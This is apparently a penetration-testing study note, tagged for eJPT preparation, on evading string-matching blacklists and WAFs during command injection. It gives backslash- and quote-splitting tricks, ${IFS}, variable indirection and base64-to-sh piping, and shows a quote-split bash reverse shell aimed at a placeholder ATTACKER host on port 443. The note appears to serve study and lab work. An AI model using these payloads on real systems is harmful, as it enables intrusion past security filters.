---
type: technique
tags: [ejpt:web-pentest]
tools: [netcat]
cves: []
related: [[command-injection]], [[reverse-shells]]
---

# WAF / Blacklist Bypass

A filter (WAF, input validator, "dangerous command" checker) blocks payloads by matching **strings**. Defeat string matching by ensuring the signature never appears literally, while the shell still runs what you meant.

## Detect the filter

- Send a lone `'`. An error like `can't access property "replace", s is null` shows your input is being parsed/transformed — and *where* it breaks. Parse errors are recon, not noise.
- Send a benign metacharacter (`; id`, `| id`). A message like `✗ Blacklist: Dangerous command detected in path.` confirms a **blacklist** (deny-list) — the weaker of the two, because every signature it blocks is one you can reshape.

## Bypass an exact-string blacklist

The filter greps the raw input for literals (`whoami`, `bash`, `;` …). Split them so the literal never occurs:

```sh
# backslash splitting — the shell eats the backslashes: \whoam\i runs as whoami
/home | \whoam\i

# quote splitting — ba's'h and bas''h both concatenate to bash
/home | ba's'h -c 'bas''h -i >& /dev/tcp/ATTACKER/443 0>&1'
```

Same family of tricks: `${IFS}` instead of spaces, `${0}`/`$0` for the shell name, variable indirection (`x=whoami; $x`), base64 (`echo <b64> | base64 -d | sh`).

## Why it works

The shell tokenizes **after** quote and backslash removal, so `ba's'h` and `bash` produce the identical argv. The filter matched earlier, on the untouched input, and never saw its own signature. The check and the execution happen at different layers — bypass the check without changing the execution.

## Seen in

[[internal]] (directory inspector: `\whoam\i` → `www-data`, then a quote-split bash reverse shell)
